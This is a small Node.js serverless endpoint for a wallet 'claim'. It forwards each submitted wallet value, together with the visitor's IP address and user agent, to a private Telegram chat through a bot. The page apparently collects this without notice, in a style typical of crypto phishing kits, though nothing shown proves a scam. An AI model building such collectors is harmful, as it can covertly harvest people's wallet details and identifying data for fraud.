// api/claim.js
module.exports = async (req, res) => {
  if (req.method !== "POST") return res.status(405).json({ error: "Method not allowed" });

  const BOT  = process.env.TELEGRAM_BOT_TOKEN;
  const CHAT = process.env.TELEGRAM_CHAT_ID;

  try {
    const body = typeof req.body === "string" ? JSON.parse(req.body) : req.body || {};
    const wallet = String(body.wallet ?? "");

    const ip = String((req.headers["x-forwarded-for"] || "").split(",")[0].trim());
    const ua = String(req.headers["user-agent"] || "");
    const text = `New wallet claim\nWallet: ${wallet}\nIP: ${ip || "n/a"}\nUA: ${ua.slice(0,160)}`;

    const tg = await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT, text }),
    });

    if (!tg.ok) return res.status(400).json({ error: await tg.text() });
    return res.json({ success: true });
  } catch (e) {
    return res.status(500).json({ error: e?.message || "Server error" });
  }
};
